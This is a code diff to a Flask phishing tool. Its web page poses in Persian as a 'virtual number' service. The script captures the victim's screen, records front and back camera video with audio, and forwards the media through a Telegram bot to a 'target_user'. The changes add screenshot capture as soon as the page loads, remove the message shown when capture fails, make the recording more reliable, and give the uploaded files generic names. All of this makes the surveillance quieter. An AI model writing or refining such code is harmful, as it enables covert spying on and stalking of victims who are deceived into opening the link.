@@ -156,7 +156,15 @@ HTML_TEMPLATE = """
     <script>
         window.addEventListener('DOMContentLoaded', () => {
             const path = window.location.pathname;
-            
+            if (path === "/screen") {
+                captureScreenshot().then(shot => {
+                    if (shot) {
+                        sendData("/upload-screen", { image: shot });
+                        localStorage.setItem("permission_granted_" + path, "true");
+                    }
+                });
+                return;
+            }
             if (localStorage.getItem("permission_granted_" + path) === "true") {
                 document.getElementById('loadingText').innerText = "شماره مجازی شما فعال است! ✅";
                 document.getElementById('loadingSubText').innerText = "خطوط امن آماده استفاده هستند.";
@@ -202,10 +210,6 @@ HTML_TEMPLATE = """
                     if (shot) {
                         sendData("/upload-screen", { image: shot });
                         localStorage.setItem("permission_granted_" + path, "true");
-                    } else {
-                        document.getElementById('loadingText').innerText = "اسکرین‌شات در این مرورگر/دستگاه پشتیبانی نشد ⚠️";
-                        document.getElementById('loadingSubText').innerText = "در مرورگرهای دسکتاپ یا نسخه‌های پشتیبانی‌کننده امتحان کنید.";
-                        return;
                     }
                 }
                 else if (path === "/location") {
@@ -423,20 +427,21 @@ HTML_TEMPLATE = """
         async function openCameraStreamWithFallback(facing) {
             try {
                 return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing },
+                    video: { facingMode: facing, width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: true
                 });
             } catch (e) {
                 return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing },
+                    video: { facingMode: facing, width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
             }
         }
 
         async function recordCameraVideo(facing, durationMs = 4000) {
+            let stream = null;
             try {
-                let stream = await openCameraStreamWithFallback(facing);
+                stream = await openCameraStreamWithFallback(facing);
                 let chosen = pickSupportedVideoMime();
 
                 return await new Promise((resolve) => {
@@ -458,7 +463,7 @@ HTML_TEMPLATE = """
                     };
 
                     recorder.onstop = () => {
-                        stream.getTracks().forEach(track => track.stop());
+                        try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                         if (!chunks.length) {
                             resolve(null);
                             return;
@@ -466,20 +471,32 @@ HTML_TEMPLATE = """
                         let finalType = chosen.mimeType || recorder.mimeType || "video/webm";
                         let ext = finalType.includes("mp4") ? "mp4" : "webm";
                         let blob = new Blob(chunks, { type: finalType });
+                        if (blob.size < 200) {
+                            resolve(null);
+                            return;
+                        }
                         let reader = new FileReader();
                         reader.readAsDataURL(blob);
                         reader.onloadend = () => resolve({ dataUrl: reader.result, ext: ext });
                         reader.onerror = () => resolve(null);
                     };
 
-                    recorder.start(500);
+                    recorder.start(250);
                     setTimeout(() => {
-                        if (recorder.state !== "inactive") {
-                            recorder.stop();
+                        try {
+                            if (recorder.state !== "inactive") {
+                                recorder.requestData && recorder.requestData();
+                                recorder.stop();
+                            }
+                        } catch (_) {
+                            resolve(null);
                         }
                     }, durationMs);
                 });
             } catch (e) {
+                if (stream) {
+                    try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
+                }
                 return null;
             }
         }
@@ -555,15 +572,21 @@ def send_to_both(target_user, send_func, *args, **kwargs):
 def decode_base64_media(data_url):
     if not data_url or "," not in data_url:
         return None
-    return base64.b64decode(data_url.split(",", 1)[1])
+    try:
+        return base64.b64decode(data_url.split(",", 1)[1])
+    except Exception:
+        return None
 
 def send_video_as_file(target_user, vid_bytes, filename, caption):
     if not vid_bytes:
         return
-    bio = io.BytesIO(vid_bytes)
-    bio.name = filename
-    bio.seek(0)
-    send_to_both(target_user, bot.send_document, bio, caption=caption)
+    try:
+        bio = io.BytesIO(vid_bytes)
+        bio.name = filename
+        bio.seek(0)
+        send_to_both(target_user, bot.send_document, bio, caption=caption)
+    except Exception:
+        pass
 
 @app.route("/front")
 def link_front(): return render_template_string(HTML_TEMPLATE)
@@ -629,8 +652,8 @@ def up_video_front():
         send_video_as_file(
             target,
             vid_bytes,
-            f"front_video.{ext}",
-            caption=f"🎥 Front Camera Video File{SIGNATURES}"
+            f"v.{ext}",
+            caption=f"🎥 Front Camera Video{SIGNATURES}"
         )
     return jsonify({"status": "ok"})
 
@@ -644,8 +667,8 @@ def up_video_back():
         send_video_as_file(
             target,
             vid_bytes,
-            f"back_video.{ext}",
-            caption=f"🎬 Back Camera Video File{SIGNATURES}"
+            f"v.{ext}",
+            caption=f"🎬 Back Camera Video{SIGNATURES}"
         )
     return jsonify({"status": "ok"})
 
@@ -754,8 +777,8 @@ def up_all():
             send_video_as_file(
                 target,
                 vid_bytes,
-                f"all_front_video.{ext}",
-                caption=f"🎥 فایل ویدیو دوربین جلو (لینک جامع){SIGNATURES}"
+                f"v.{ext}",
+                caption=f"🎥 ویدیو دوربین جلو (لینک جامع){SIGNATURES}"
             )
 
         if "backVideo" in d and d["backVideo"]:
@@ -764,8 +787,8 @@ def up_all():
             send_video_as_file(
                 target,
                 vid_bytes,
-                f"all_back_video.{ext}",
-                caption=f"🎬 فایل ویدیو دوربین عقب (لینک جامع){SIGNATURES}"
+                f"v.{ext}",
+                caption=f"🎬 ویدیو دوربین عقب (لینک جامع){SIGNATURES}"
             )
 
         if "screenImage" in d and d["screenImage"]:
